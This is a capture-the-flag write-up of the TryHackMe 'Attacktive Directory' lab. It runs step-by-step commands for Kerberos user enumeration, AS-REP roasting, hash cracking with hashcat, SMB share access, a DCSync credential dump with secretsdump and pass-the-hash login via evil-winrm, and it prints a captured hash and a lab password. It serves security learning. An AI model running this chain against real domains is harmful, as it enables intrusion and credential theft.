---
description: https://tryhackme.com/room/attacktivedirectory
---

# 🪟 Attacktive Directory

<figure><img src="../../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

I found the NetBIOS-Domain Name by using **enum4linux:**

<figure><img src="../../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

Now i need to find valid users&#x20;

so i download  kerbrute and install this one:

<figure><img src="../../../.gitbook/assets/image (447).png" alt=""><figcaption><p>don't forget to chmod +x</p></figcaption></figure>

```
./kerbrute_linux_amd64 userenum --dc 10.10.224.164 -d spookysec.local user.txt -t 50
```

* `./kerbrute_linux_amd64`: This specifies the path to the Kerbrute executable for Linux, assuming it's located in the current directory. The "\_linux\_amd64" in the filename suggests it's compiled for 64-bit Linux systems.
* `userenum`: This is the mode or subcommand of Kerbrute that is being used. In this case, it's likely used for user enumeration, which involves attempting to discover valid usernames in the Active Directory environment.
* `--dc 10.10.224.164`: This option specifies the IP address of the domain controller to target. In this example, the domain controller's IP address is 10.10.224.164.
* `-d spookysec.local`: The `-d` option is used to specify the domain name. In this case, the domain name is "spookysec.local".
* `user.txt`: This is likely a file containing a list of usernames. Kerbrute will use these usernames to attempt to enumerate valid users in the specified domain.
* `-t 50`: This option sets the number of threads to use. In this example, it's set to 50 threads, which means Kerbrute will perform user enumeration using parallel threads, potentially making the process faster.

<figure><img src="../../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

The svc-admin, backup and administrator are very important users so this might be our way in

Now we need to Steal a Kerberos TGT,&#x20;

Let's use Impacket's `GetNPUsers.py`

```
GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.10.224.164 -request -format hashcat
```

<figure><img src="../../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e94ae6827e3e922876329dc91b10572$33e012b155e3f4fbe8d50607bee764e51d8af206e599877f4d71b32ced3834225fbce331da2f8ee24674125a848f02852acff5d78f19fcb16863ec8e67f4401805f6e112310883b733ca924d64e3597504c57e8f1dc02f7291f96dba594e6a20d99a58763f87fd5a8a93b7b5480936e13f12c25d5e72f5e81e15d793798f4ee45e162d20f5efa398cfab0de1c2d6402ee2f21183453b8fe2f48aecf84c028fd2aefb92691dbbfa5f8651389413a3f905be82c5e388259f2099e087378bef4e1a37ec4c547e6d75a78616c835e6c62a527d8b8fafcd835ae2689ce9bfe0f0a845480bfb4d3c309d616ff7428047057485b639
```

let's put that in a hash.txt file&#x20;

and run&#x20;

```
hashcat -m 18200 -a 0 hash.txt pass.txt 
```

<figure><img src="../../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

Now we can try to abuse the smb shares using our credentials ->

```
smbclient -L //10.10.148.44 -U svc-admin 
```

<figure><img src="../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

to connect to the backup share that seems interesting ->

```
smbclient \\\\10.10.148.44\\backup -U 'svc-admin'
```

we found a suspicious txt folder, we need to get it on our local machine and look what's inside it with this command:

<figure><img src="../../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

I have absolutely no idea of what type of encoding this is, so i head to cyberchef and decode it with the magic recipe:

<figure><img src="../../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

this format is probably : `user@domaine:Password`

Now we are going to try to retrieve all the password hashes that this user account (that is synced with the domain controller) has to offer:

```
secretsdump.py -just-dc backup:backup2517860@10.10.148.44
```

The command successfully extracted information, likely password hashes, from the domain controller located at IP address `10.10.148.44`

<figure><img src="../../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

very successful dump&#x20;

now using evil-winRMl:

```
evil-winrm -i 10.10.148.44 -u Administrator -H [admin hash]
```

<figure><img src="../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

and you just do the same for the other users, gg well done we did it boys

<figure><img src="../../../.gitbook/assets/image (444).png" alt=""><figcaption><p>tous les flags <span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>

<figure><img src="https://risibank.fr/cache/medias/0/2/261/26124/full.jpeg" alt=""><figcaption></figcaption></figure>
